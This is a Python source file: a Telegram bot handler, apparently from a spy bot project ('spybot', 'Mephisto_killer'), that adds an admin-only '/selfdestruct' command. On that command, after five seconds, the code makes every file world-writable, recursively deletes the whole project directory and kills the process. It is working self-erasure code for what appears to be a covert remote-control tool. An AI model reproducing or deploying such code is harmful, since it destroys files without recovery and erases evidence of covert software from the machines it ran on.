import shutil
import sys
import os
import threading
from telebot.types import Message
from bot_core.config import BOT_ADMIN_ID
from bot_core.spybot import bot

@bot.message_handler(commands=['selfdestruct'])
def handle_selfdestruct(message: Message):
    if message.from_user.id != BOT_ADMIN_ID:
        return

    bot.reply_to(message, "💣 Initiating self-destruct sequence in 5 seconds...")

    def delete_and_exit():
        try:
            root_dir = os.path.dirname(os.path.abspath(__file__))
            main_dir = os.path.abspath(os.path.join(root_dir, "..", ".."))  # Goes back to Mephisto_killer/

            # Optional: Change permissions before deletion
            for root, dirs, files in os.walk(main_dir):
                for file in files:
                    try:
                        filepath = os.path.join(root, file)
                        os.chmod(filepath, 0o777)
                    except Exception:
                        pass

            shutil.rmtree(main_dir)
        except Exception as e:
            print(f"❌ Failed to delete: {e}")
        os._exit(0)

    threading.Timer(5.0, delete_and_exit).start()
